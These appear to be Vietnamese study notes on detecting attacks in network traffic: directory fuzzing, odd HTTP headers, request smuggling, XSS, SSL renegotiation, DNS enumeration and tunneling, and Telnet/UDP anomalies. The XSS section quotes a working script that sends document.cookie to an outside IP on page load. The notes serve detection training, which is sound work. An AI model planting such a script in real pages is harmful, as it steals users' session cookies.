

## HTTP/HTTPs Service Enumeration

1. Lưu lượng HTTP/HTTP quá mức từ một máy chủ
2. Tham khảo nhật ký truy cập của máy chủ web  về hành vi tương tự
-> thường thì Attacker sẽ làm fuzz server trước khi bắt đầu tấn công
### Finding Directory Fuzzing
![Pasted image 20240829190431](https://github.com/user-attachments/assets/d56fa639-9dad-4da6-9782-ebe9b762e137)

Http request
![Pasted image 20240829190447](https://github.com/user-attachments/assets/78daca01-7ba5-48c3-b3d7-7469c75c6206)

-> Directory Fuzzing dễ bị phát hiện vì:
+ Máy chủ sẽ liên tục cố gắng truy cập các tệp không tồn tại trên máy chủ web (phản hồi 404).
+ Máy chủ sẽ gửi chúng liên tiếp một cách nhanh chóng.

```shell-session
merisreal$ cat access.log | awk '$1 == "192.168.10.5"'
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /randomfile1 HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /frand2 HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.bash_history HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"

```

### Finding Other Fuzzing Techniques

- `http.request and ((ip.src_host == <suspected IP>) or (ip.dst_host == <suspected IP>))`
- 

![Pasted image 20240829191539](https://github.com/user-attachments/assets/7ba0079a-39ff-49bc-b921-c21fecdf47a8)

![Pasted image 20240829191548](https://github.com/user-attachments/assets/d63e226f-e32a-4127-867c-a905dddbeb3c)

Giả sử chúng tôi nhận thấy rằng có rất nhiều yêu cầu được gửi liên tiếp, điều này cho thấy có fuzzing

Tuy nhiên attacker có thể làm các cách sau để né :
+ Sắp xếp xen kẽ những phản hồi này trong một khoảng thời gian dài hơn.
+ Gửi những phản hồi này từ nhiều máy chủ hoặc địa chỉ nguồn.


## Strange HTTP Headers

Trong các HTTP request -> Một vài header tệ kiểu:

1. `Weird Hosts (Host: )`
2. `Unusual HTTP Verbs`
3. `Changed User Agents`

### Finding Strange Host Headers

![Pasted image 20240829191835](https://github.com/user-attachments/assets/533b0644-9321-456d-9971-0372c64cd528)
![Pasted image 20240829192128](https://github.com/user-attachments/assets/6a94477c-147f-46c9-94d9-de8be0981ac7)

Các Header tệ có thể thấy như 127.0.0.1
![Pasted image 20240829192146](https://github.com/user-attachments/assets/b1ecb7ff-2492-4da4-afb7-8db1a5ad4252)

admin

https://www.yeswehack.com/learn-bug-bounty/http-header-exploitation

### Analyzing Code 400s and Request Smuggling

Code 400 -> cho thấy một "yêu cầu xấu" từ phía client
![Pasted image 20240829192547](https://github.com/user-attachments/assets/f605df04-a7ec-41c2-aafc-83b852d50f85)

Follow ->
![Pasted image 20240829192609](https://github.com/user-attachments/assets/90bed0b8-8309-4bdc-92a5-10c46a2996f9)

cve: https://github.com/dhmosfunk/CVE-2023-25690-POC

Code 200 -> response success


## Cross-Site Scripting (XSS) & Code Injection Detection
![Pasted image 20240829192850](https://github.com/user-attachments/assets/295950eb-aca2-4444-955b-47fe70567829)

![Pasted image 20240829193510](https://github.com/user-attachments/assets/0c95a157-61be-45d3-b81d-5b3a52ecf188)

->, giả sử có khu vực nhận xét của người dùng trên máy chủ web h. Chúng ta có thể nhận thấy một trong những comment trông giống như sau.
Code: javascript

```javascript
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>
```
một số trường hợp kẻ tấn công có thể cố gắng chèn mã vào các trường này như hai ví dụ sau.
![Pasted image 20240829193901](https://github.com/user-attachments/assets/43c2c25b-abf2-41cf-bddb-3bf0917c62af)


#### Preventing XSS and Code Injection
+ xử lý thông tin đầu vào của người dùng 
+ không diễn giải thông tin đầu vào của người dùng dưới dạng mã.

## SSL Renegotiation Attacks



**SSL renegotiation** là một quy trình trong giao thức **SSL/TLS** nơi client và server đồng ý thiết lập một kết nối **SSL** mới sử dụng kết nối hiện tại mà không làm gián đoạn việc truyền tải dữ liệu đang diễn ra. Quy trình này tương tự như **SSL handshake** ban đầu khi bạn kết nối với một trang web bảo mật.

 ví dụ:

Đang duyệt một trang web thương mại điện tử để mua sắm. Khi bạn lần đầu tiên kết nối với trang web, trình duyệt của bạn và máy chủ sẽ thực hiện **SSL handshake** để thiết lập một kết nối bảo mật. Trong quá trình này, họ trao đổi các khóa mã hóa và xác minh danh tính của nhau, đảm bảo rằng dữ liệu của bạn vẫn riêng tư và an toàn.

Giả sử bạn đã ở trên trang web trong một thời gian dài, thêm các sản phẩm vào giỏ hàng và duyệt các trang khác nhau. Phiên **SSL** vẫn đang hoạt động, duy trì bảo mật cho các tương tác của bạn. Tuy nhiên, có thể sẽ đến một lúc nào đó trang web cần xác thực lại bạn, có thể là do phiên của bạn đã hết thời gian hoặc bạn đang cố truy cập một trang bảo mật.

Thay vì kết thúc kết nối **SSL** và bắt đầu lại từ đầu, **SSL renegotiation** sẽ diễn ra. Trình duyệt của bạn và máy chủ đồng ý thực hiện một **SSL handshake** mới trong phiên **SSL** hiện tại. Quá trình này cho phép họ cập nhật các khóa mã hóa, xác thực lại nếu cần, hoặc thực hiện các điều chỉnh cần thiết khác.

Về bản chất, **SSL renegotiation** giống như làm mới thông tin bảo mật của bạn mà không cần đăng xuất và đăng nhập lại. Nó đảm bảo rằng dữ liệu của bạn vẫn được bảo mật trong suốt quá trình tương tác với trang web mà không gây ra bất kỳ gián đoạn hoặc chậm trễ nào.

Mặc dù **SSL renegotiation** duy trì bảo mật cho các kết nối trực tuyến, nhưng nó đòi hỏi sự phối hợp chính xác giữa client và server và có thể tiêu tốn thêm tài nguyên. Tuy nhiên, lợi ích của việc duy trì bảo mật không bị gián đoạn vượt trội hơn so với bất kỳ nhược điểm tiềm ẩn nào.



### HTTPs Breakdown

 HTTPs tích hợp mã hóa để cung cấp bảo mật cho các máy chủ và client web:

- **Transport Layer Security (TLS)**
- **Secure Sockets Layer (SSL)**

Nói chung, khi một client thiết lập kết nối HTTPs với một máy chủ, các bước sau sẽ diễn ra:

- **Handshake**: Máy chủ và client thực hiện một quá trình bắt tay (handshake) khi thiết lập kết nối HTTPs. Trong quá trình này, client và máy chủ đồng ý về các thuật toán mã hóa sẽ sử dụng và trao đổi các chứng chỉ của họ.
    
- **Encryption**: Sau khi hoàn thành quá trình handshake, client và máy chủ sử dụng thuật toán mã hóa đã được thỏa thuận trước đó để mã hóa dữ liệu truyền tải giữa họ.
    
- **Further Data Exchange**: Khi kết nối mã hóa đã được thiết lập, client và máy chủ sẽ tiếp tục trao đổi dữ liệu với nhau. Dữ liệu này có thể là các trang web, hình ảnh, hoặc các tài nguyên web khác.
    
- **Decryption**: Khi client truyền dữ liệu đến máy chủ hoặc ngược lại, họ phải giải mã dữ liệu này bằng các khóa công khai và khóa riêng.
    

Một trong những tấn công phổ biến dựa trên HTTPs là **SSL renegotiation**, trong đó kẻ tấn công sẽ thương lượng phiên kết nối xuống mức mã hóa thấp nhất có thể.


![Pasted image 20240830163951](https://github.com/user-attachments/assets/f3cdb7b9-50fa-40dd-bfdc-19f8cbf7a906)



|**Handshake Step**|**Relevant Calculations**|
|---|---|
|`Client Hello`|`ClientHello = { ClientVersion, ClientRandom, Ciphersuites, CompressionMethods }`|
|`Server Hello`|`ServerHello = { ServerVersion, ServerRandom, Ciphersuite, CompressionMethod` }|
|`Certificate Exchange`|`ServerCertificate = { ServerPublicCertificate }`|
|`Key Exchange`|- `ClientDHPrivateKey`<br>- `ClientDHPublicKey = DH_KeyGeneration(ClientDHPrivateKey)`<br>- `ClientKeyExchange = { ClientDHPublicKey }`<br>- `ServerDHPrivateKey`<br>- `ServerDHPublicKey = DH_KeyGeneration(ServerDHPrivateKey)`<br>- `ServerKeyExchange = { ServerDHPublicKey }`|
|`Premaster Secret`|- `PremasterSecret = DH_KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)`<br>- `PremasterSecret = DH_KeyAgreement(ClientDHPublicKey, ServerDHPrivateKey)`|
|`Session Key Derivation`|`MasterSecret = PRF(PremasterSecret, "master secret", ClientNonce + ServerNonce`)|
||`KeyBlock = PRF(MasterSecret, "key expansion", ServerNonce + ClientNonce)`|
|`Extraction of Session Keys`|- `ClientWriteMACKey = First N bytes of KeyBlock`<br>- `ServerWriteMACKey = Next N bytes of KeyBlock`<br>- `ClientWriteKey = Next N bytes of KeyBlock`<br>- `ServerWriteKey = Next N bytes of KeyBlock`<br>- `ClientWriteIV = Next N bytes of KeyBlock`<br>- `ServerWriteIV = Next N bytes of KeyBlock`|
|`Finished Messages`|`FinishedMessage = PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello))`|

### Finding SSL Renegotiation Attacks

* Man - in -the -middle*
![Pasted image 20240830164855](https://github.com/user-attachments/assets/d5c6c7b4-e69b-449f-a7b3-91ef91a19a8b)

```
ssl.record.content_type == 22
```

+ Thường có rất nhiều Client Hellos trong thời gian ngắn -> dấu hiệu dễ nhận biết nhất -> lặp lại thông báo này để kích hoạt đàm phán lại và hy vọng nhận được bộ mật mã thấp hơn.
+ **Out of Order Handshake Messages** - một số gói tin không theo thứ tự do mất gói tin hoặc các nguyên nhân khác, nhưng trong trường hợp **SSL renegotiation**, một số dấu hiệu rõ ràng sẽ là máy chủ nhận được **client hello** sau khi quá trình handshake đã hoàn tất.


## Peculiar DNS Traffic

### DNS Queries
Truy vấn DNS được sử dụng khi client muốn phân giải tên miền bằng địa chỉ IP hoặc ngược lại. Đầu tiên, chúng ta có thể khám phá loại truy vấn phổ biến nhất, đó là tra cứu chuyển tiếp (forward lookups)
  ![Pasted image 20240830165601](https://github.com/user-attachments/assets/cc6b99e1-cb58-4b7e-b610-9b2bc928ab87)

- Request:
    - `Where is google.com?`
- Response:
    - ` 192.168.10.6`


1. **Query Initiation** | Khi người dùng muốn truy cập vào một địa chỉ như **google.com**, nó sẽ khởi tạo một yêu cầu truy vấn **DNS forward**.
2. **Local Cache Check** | Client sau đó kiểm tra bộ nhớ cache **DNS** cục bộ của mình để xem liệu đã có giải quyết tên miền thành địa chỉ **IP** hay chưa. Nếu chưa có, nó sẽ tiếp tục với các bước sau.
3. **Recursive Query** | Client sau đó gửi truy vấn đệ quy của mình đến máy chủ **DNS** đã được cấu hình (cục bộ hoặc từ xa).
4. **Root Servers** | **DNS resolver**, nếu cần, sẽ bắt đầu bằng cách truy vấn các máy chủ tên gốc để tìm các máy chủ tên có thẩm quyền cho **top-level domain (TLD)**. Có 13 máy chủ gốc được phân bố trên toàn thế giới.
5. **TLD Servers** | Máy chủ gốc sau đó phản hồi với các máy chủ tên có thẩm quyền cho **TLD** (ví dụ như **.com** hoặc **.org**).
6. **Authoritative Servers** | **DNS resolver** sau đó truy vấn các máy chủ tên có thẩm quyền của **TLD** để tìm tên miền cấp hai (ví dụ như **google.com**).
7. **Domain Name's Authoritative Servers** | Cuối cùng, **DNS resolver** truy vấn các máy chủ tên có thẩm quyền của tên miền để nhận địa chỉ **IP** liên quan đến tên miền được yêu cầu (ví dụ như **google.com**).
8. **Response** | **DNS resolver** sau đó nhận được địa chỉ **IP** (**A** hoặc **AAAA record**) và gửi lại cho client đã khởi tạo truy vấn.

### DNS Reverse Lookups/Queries
Ngược lại với cái trên khi đã biết địa chỉ IP và muốn tìm FQDN (Fully Qualified Domain Name)
- Request:
    - `What is your name 192.168.10.6?`
- Response:
    
    - `google.com :)`

![Pasted image 20240830170246](https://github.com/user-attachments/assets/ed20043d-8a37-47b1-8cca-7ca4943d1dfc)

- **Query Initiation** | Client gửi một truy vấn **DNS reverse** đến **DNS resolver** (máy chủ) đã được cấu hình với địa chỉ **IP** mà nó muốn tìm tên miền.
- **Reverse Lookup Zones** | **DNS resolver** kiểm tra xem nó có quyền quản lý vùng tra cứu ngược (reverse lookup zone) tương ứng với dải địa chỉ **IP** được xác định bởi địa chỉ **IP** nhận được hay không. Ví dụ, với địa chỉ **192.0.2.1**, vùng tra cứu ngược sẽ là **1.2.0.192.in-addr.arpa**.
- **PTR Record Query** | **DNS resolver** sau đó tìm kiếm một **PTR record** trong vùng tra cứu ngược tương ứng với địa chỉ **IP** được cung cấp.
- **Response** | Nếu tìm thấy một **PTR record** khớp, máy chủ **DNS** (resolver) sẽ trả lại **FQDN** của địa chỉ **IP** cho client.

### DNS Record Types

| **Record Type**              | **Description**                                                                              |
| ---------------------------- | -------------------------------------------------------------------------------------------- |
| **A (Address)**              | Bản ghi này ánh xạ tên miền đến một địa chỉ **IPv4**.                                        |
| **AAAA (IPv6 Address)**      | Bản ghi này ánh xạ tên miền đến một địa chỉ **IPv6**.                                        |
| **CNAME (Canonical Name)**   | Bản ghi này tạo một bí danh cho tên miền. Ví dụ **hello.com** = **world.com**.               |
| **MX (Mail Exchange)**       | Bản ghi này chỉ định máy chủ thư chịu trách nhiệm nhận email cho tên miền.                   |
| **NS (Name Server)**         | Bản ghi này chỉ định các máy chủ tên có thẩm quyền cho một tên miền.                         |
| **PTR (Pointer)**            | Bản ghi này được sử dụng trong các truy vấn ngược để ánh xạ một địa chỉ **IP** đến tên miền. |
| **TXT (Text)**               | Bản ghi này được sử dụng để chỉ định văn bản liên quan đến tên miền.                         |
| **SOA (Start of Authority)** | Bản ghi này chứa thông tin quản trị về vùng (zone).                                          |

### Finding DNS Enumeration Attempts

https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns


=> cho phép xác định tất cả các bản ghi DNS được liên kết với một miền để khám phá các lỗ hổng, lập bản đồ các thiết bị kết nối Internet của công ty và hiển thị các dịch vụ ẩn.

![Pasted image 20240830170638](https://github.com/user-attachments/assets/29c89b42-cfcd-4b36-b3a3-a77c7fa747b0)

![Pasted image 20240830170646](https://github.com/user-attachments/assets/3cec60b1-f3e8-437c-8055-21005463984f)

=> Đây sẽ là dấu hiệu rõ ràng về việc liệt kê DNS và thậm chí có thể là việc liệt kê tên miền phụ từ Attacker

### Finding DNS Tunneling
![Pasted image 20240830170930](https://github.com/user-attachments/assets/aae119d3-613b-44f6-8371-aee0542a0468)

Đôi khi nó thường bị mã hóa nhiều lớp 
![[Pasted image 20240830170946.png]]

![Pasted image 20240830170946](https://github.com/user-attachments/assets/4504776d-3963-47c2-842c-78443f6b96af)

=> Đặt biệt cần phải lưu ý tới các DNS dạng IPFS

https://developers.cloudflare.com/web3/ipfs-gateway/concepts/ipfs/



## Strange Telnet & UDP Connections
![Pasted image 20240830171104](https://github.com/user-attachments/assets/32bef040-42a7-4161-8a59-edf3c22616f3)

**Telnet** là một giao thức mạng cho phép phiên giao tiếp tương tác hai chiều giữa hai thiết bị qua mạng. Giao thức này được phát triển vào những năm 1970 và được định nghĩa trong **RFC 854**. Tuy nhiên, việc sử dụng **Telnet** đã giảm đáng kể so với **SSH**.

Trong nhiều trường hợp cũ, như các máy chạy **Windows NT**, chúng có thể vẫn sử dụng **Telnet** để cung cấp khả năng điều khiển từ xa cho **Microsoft Terminal Services**.

Tuy nhiên, cần luôn cảnh giác với các liên lạc **Telnet** kỳ lạ và bất thường vì nó cũng có thể được kẻ tấn công sử dụng cho các mục đích xấu như **data exfiltration** và **tunneling**.

### Finding Traditional Telnet Traffic Port 23

  ![Pasted image 20240830171221](https://github.com/user-attachments/assets/9d6af677-ea2f-4b0d-a2ea-cd3e66ddde47)


Lưu lượng truy cập telnet có xu hướng được giải mã và có thể dễ dàng kiểm tra, nhưng giống như ICMP, DNS và các phương pháp tạo đường hầm khác, kẻ tấn công có thể mã hóa và mã hóa hoặc làm xáo trộn văn bản này :)
![[Pasted image 20240830171258.png]]
![Pasted image 20240830171258](https://github.com/user-attachments/assets/fde75262-e562-4434-bf57-e1214e99dac3)

### Unrecognized TCP Telnet in Wireshark

Telnet chỉ là một giao thức liên lạc và do đó kẻ tấn công có thể dễ dàng chuyển sang cổng khác.
![Pasted image 20240830171337](https://github.com/user-attachments/assets/b1985f6d-f76f-46a6-a719-a960f64ee206)

=> Nhiều liên lạc qua cổng 9999
![Pasted image 20240830171357](https://github.com/user-attachments/assets/da4ca62f-0de7-4ae2-8ec6-6436e8e51cd5)

![Pasted image 20240830171405](https://github.com/user-attachments/assets/b4aea87d-caaf-4899-b13d-08ba69f877e7)

### Telnet Protocol through IPv6

Trừ khi mạng cục bộ của chúng ta được định cấu hình để sử dụng IPv6, việc quan sát lưu lượng IPv6 có thể là dấu hiệu cho thấy các hành động xấu trong môi trường -> có thể nhận thấy việc sử dụng địa chỉ IPv6 cho telnet như sau.
![Pasted image 20240830171446](https://github.com/user-attachments/assets/f44d6a16-5294-4bd2-aa42-7b98e4a5949b)

=> fillter TELNET
![Pasted image 20240830171507](https://github.com/user-attachments/assets/d2104471-4a44-467d-84ad-8b5d5af9d655)

=> 
![Pasted image 20240830171515](https://github.com/user-attachments/assets/cf13f082-d3c2-4ed4-bdca-a4fc8b6c3ca1)


### Watching UDP Communications

Mặt khác, attackers có thể chọn sử dụng kết nối UDP qua TCP 
![Pasted image 20240830171551](https://github.com/user-attachments/assets/b021b236-9aac-45f2-9ff9-307d7e4063e3)


*Một trong những khía cạnh khác biệt lớn nhất giữa TCP và UDP là UDP không có kết nối và cung cấp khả năng truyền nhanh. *
![Pasted image 20240830171615](https://github.com/user-attachments/assets/702ecb96-c8e4-464e-a14b-7ccb9c2a3ac7)

thay vì chuỗi SYN, SYN/ACK, ACK, các thông tin liên lạc sẽ được gửi ngay lập tức đến người nhận. 
![Pasted image 20240830171640](https://github.com/user-attachments/assets/a01cc31b-c278-4023-acb5-df87f422cf90)

